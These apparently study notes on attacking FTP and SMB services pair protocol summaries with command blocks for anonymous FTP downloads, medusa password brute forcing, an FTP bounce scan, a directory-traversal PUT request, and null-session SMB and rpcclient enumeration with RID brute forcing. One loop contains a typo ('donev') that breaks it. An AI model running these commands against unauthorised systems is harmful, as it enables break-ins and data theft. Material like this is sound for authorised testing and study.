# Attacking Common Services

### Getting IPs of web servers
```shell
for i in $(cat subdomainlist);do host $i | grep "has address" | grep $DOMAIN | cut -d" " -f1,4;donev
```

### Server info using Shodan
```shell
for i in $(cat ip-addresses.txt);do shodan host $i;done
```

## FTP

- File Tranfer Protocol, uses TCP Port `21`
- Application layer of the TCP/IP protocol stack
- It is a Clear text protocol and data can be sniffed.
- Trivial File Transfer Protocol (TFTP) is simpler than FTP and performs file transfers between
client and server processes. It does not provide user authentication and other features supported by FTP.
- Dangerous settings include: anonymous login, file upload, create directory, usage of commands
like `STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE`

```shell
# Download a file
get filename
# Download all available files
wget -m --no-passive ftp://anonymous:anonymous@$IP
# Upload file
put local_filename
# When service is using SSL/TLS
openssl s_client -connect $TARGET_IP:21 -starttls ftp
```

- Attacking FTP:

```shell
# Using nmap scripts
sudo nmap -sC -sV -p 21 $TARGET_IP
# Password brute forcing
medusa -u $USERNAME -P $PASSWORD_FILE -h $IP -M ftp
# FTP Bounce Attack
# An FTP bounce attack is a network attack that uses FTP servers
# to deliver outbound traffic to another device on the network. 
# The attacker uses a PORT command to trick the FTP connection 
# into running commands and getting information from a device
# other than the intended server.
nmap -Pn -v -n -p80 -b anonymous:password@$TARGET_IP $INTERNAL_IP
# FTP directory traversal vulnerability
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```


## SMB

- Server Message Block, uses TCP.
- A client-server protocol that regulates access to files and entire directories and other network resources.
- Access rights are defined by ACLs.
- The ACLs are defined based on the shares and do not correspond to the rights assigned locally on the server.


- Samba implements the Common Internet File System (CIFS) network protocol.
- CIFS is a specific version of SMB.
- When SMB commands are transmitted over Samba to an older NetBIOS service,
connection occur over TCP ports `137, 138, and 139`.
- CIFS operates over TCP port `445` exclusively.
- Dangerous settings include: allow guest to connect, insecure default permissions of files,
logon script, magic script etc

```shell
# Accessing shares using null credentials
smbclient -N -L //$TARGET_IP
crackmapexec smb $TARGET_IP -u '' -p '' --shares
netexec smb $TARGET_IP -u '' -p '' -M spider_plus
smbmap -H $TARGET_IP

# Getting data from the shares
netexec smb $TARGET_IP -u $USER -p $PASS --shares --filter-shares READ WRITE
netexec smb $TARGET_IP -u $USER -p $PASS -M spider_plus

# Enumerating using enum4linux
enum4linux-ng.py $TARGET_IP -A  

# Downloading files
smbmap -H $TARGET_IP -u $USER -p $PASS --download $FILE_PATH
```

```shell
# Enumerating using rpcclient
rpcclient -U "" $TARGET_IP
rpcclient $> srvinfo
rpcclient $> enumdomains
rpcclient $> enumdomusers
rpcclient $> queryuser $RID
rpcclient $> querygroup $GID
rpcclient $> querydominfo
rpcclient $> netshareenumall
rpcclient $> netshareenumall $SHARENAME
```

- Attacking SMB:

```shell
# Using nmap scripts
sudo nmap $TARGET_IP -sV -sC -p139,445
nmap --script smb-vuln* -p 139,445 $TARGET_IP
# RID Brute forcing
samrdump.py $DOMAIN/$USER:$PASSWORD@$TARGET_IP
lookupsid.py guest@$TARGET_IP -no-pass
netexec smb $TARGET_IP -u guest -p '' --rid-brute
```